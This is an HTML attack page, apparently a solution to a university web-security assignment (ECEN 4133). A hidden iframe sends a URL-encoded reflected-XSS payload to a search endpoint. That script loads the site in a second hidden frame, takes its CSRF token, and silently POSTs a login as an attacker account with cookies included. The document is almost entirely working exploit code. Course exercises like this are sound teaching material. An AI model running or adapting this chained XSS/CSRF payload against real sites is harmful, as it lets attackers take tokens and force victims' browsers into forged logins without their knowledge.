<html>

<iframe  src="https://project2.ecen4133.org/search?q=%3Cscript%3Ewindow.onload%20%3D%20function%28%29%20%7B%0A%20%20%20%20%2F%2F%20Create%20an%20invisible%20iframe%20that%20loads%20the%20main%20page%0A%20%20%20%20let%20iframe%20%3D%20document.createElement%28%27iframe%27%29%3B%0A%20%20%20%20iframe.style.display%20%3D%20%27none%27%3B%0A%20%20%20%20iframe.src%20%3D%20%27https%3A%2F%2Fproject2.ecen4133.org%27%3B%0A%20%20%20%20document.body.appendChild%28iframe%29%3B%0A%0A%20%20%20%20%2F%2F%20Wait%20for%20the%20iframe%20to%20load%0A%20%20%20%20iframe.onload%20%3D%20function%28%29%20%7B%0A%20%20%20%20%20%20%20%20%2F%2F%20Extract%20the%20CSRF%20token%20from%20the%20iframe%20%28if%20available%20on%20the%20main%20page%29%0A%20%20%20%20%20%20%20%20let%20csrf_token%20%3D%20iframe.contentWindow.document.querySelector%28%22input%5Bname%3D%27csrf_token%27%5D%22%29.value%3B%0A%20%20%20%20%20%20%20%20console.log%28%27CSRF%20token%20extracted%3A%27%2C%20csrf_token%29%3B%0A%0A%20%20%20%20%20%20%20%20%2F%2F%20Create%20a%20payload%20with%20the%20stolen%20CSRF%20token%20and%20credentials%0A%20%20%20%20%20%20%20%20let%20payload%20%3D%20%60username%3Dattacker%26password%3Dl33th4x%26csrf_token%3D%24%7Bcsrf_token%7D%60%3B%0A%0A%20%20%20%20%20%20%20%20%2F%2F%20Submit%20the%20login%20request%20using%20fetch%20to%20avoid%20page%20reload%0A%20%20%20%20%20%20%20%20fetch%28%27https%3A%2F%2Fproject2.ecen4133.org%2Flogin%3Fcsrfdefense%3D1%26xssdefense%3D0%27%2C%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20method%3A%20%27POST%27%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20headers%3A%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%27Content-Type%27%3A%20%27application%2Fx-www-form-urlencoded%27%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20body%3A%20payload%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20credentials%3A%20%27include%27%20%2F%2F%20Include%20cookies%20in%20the%20request%0A%20%20%20%20%20%20%20%20%7D%29%0A%20%20%20%20%20%20%20%20.then%28response%20%3D%3E%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20%28response.ok%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20console.log%28%27Login%20successful%27%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20console.error%28%27Login%20failed%27%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%29%0A%20%20%20%20%20%20%20%20.catch%28error%20%3D%3E%20console.error%28%27Error%3A%27%2C%20error%29%29%3B%0A%20%20%20%20%7D%3B%0A%7D%3B%3C%2Fscript%3E
" style="display:none" name = "blank_frame" ></iframe> 

</html>